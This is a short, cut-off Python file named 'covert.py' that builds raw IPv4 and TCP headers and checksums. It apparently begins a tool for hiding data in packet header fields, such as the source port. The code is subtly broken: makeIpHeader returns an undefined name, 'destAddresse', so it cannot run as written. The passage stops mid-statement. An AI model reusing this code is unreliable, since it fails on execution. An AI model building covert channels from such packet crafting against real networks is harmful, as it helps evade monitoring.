#covert.py

import socket, sys
from struct import *

def makeCheckSum(msg):
	s = 0
	for i in range(0, len(msg), 2):
		w = (ord(msg[i]) << 8) + (ord(msg[i+1]))
		s = s + w
	s = (s >> 16) + (s & 0xffff)
	s = ~s & 0xffff 
	return s

def makeIpHeader(sourceIP, destIP):
	version = 4
	ihl = 5
	typeOfService = 0
	totalLength = 20 + 20 	# ip header + tcp header 
	id = 999
	flagsOffset = 0
	ttl = 255
	protocol = socket.IPPROTO_TCP
	headerChecksum = 0
	sourceAddress = socket.inet_aton(sourceIP)
	destAddress = socket.inet_aton(destIP)
	ihlVersion = (version << 4) + ihl

	return pack('!BBHHHBBH4s4s', ihlVersion, typeOfService, totalLength,
				id, flagsOffset, ttl, protocol, headerChecksum,
				sourceAddress, destAddresse)

def makeTcpHeader(port, icheckSum="none"):
	sourcePort = port
	destAddrPort = 80 		### just set to http server
	seqNum = 0
	ackNum = 0
	dataOffset = 5
	flagFin = 0
	flagSyn = 0
	flagRst = 0
	flagPsh = 0
	flagAck = 0
	flagUrg = 0

	window = socket.htons  